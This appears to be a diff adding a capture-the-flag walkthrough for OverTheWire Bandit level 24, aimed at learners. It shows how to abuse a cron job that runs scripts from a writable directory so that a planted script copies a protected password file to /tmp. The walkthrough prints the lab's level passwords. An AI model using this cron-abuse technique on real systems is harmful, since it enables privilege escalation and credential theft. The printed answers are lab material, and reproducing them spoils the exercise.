@@ -1,0 +1,41 @@
+🎯 Objective:
+         Exploit a cron job that executes scripts placed in a writable directory to steal the password.
+
+Step 1: Login as bandit23
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+Password: jc1udXuA1tiHqjIsL8yaapX5Xia1mUuH
+
+Step 2: Inspect the cron job
+
+Command: cat /etc/cron.d/cronjob_bandit24
+It runs: /usr/bin/cronjob_bandit24.sh
+
+Step 3: Read the script
+
+Command: cat /usr/bin/cronjob_bandit24.sh
+It executes all scripts in: /var/spool/bandit24/foo
+(After that)
+Scripts are deleted after execution
+Output can be written to /tmp
+
+Step 4: Create a malicious script
+
+Create a temp script: nano /tmp/getpass.sh
+Type this command:
+     cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass
+(Then)
+Save & exit. Make it executable:
+Command: chmod +x /tmp/getpass.sh
+
+Step 5: Drop the script into the cron folder
+Command: cp /tmp/getpass.sh /var/spool/bandit24/foo/
+
+Step 6: Wait for a minute
+
+The Cron will execute your script automatically. After that read the password.
+Command: cat /tmp/bandit24_pass
+
+Output:
+
+Password for Level 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
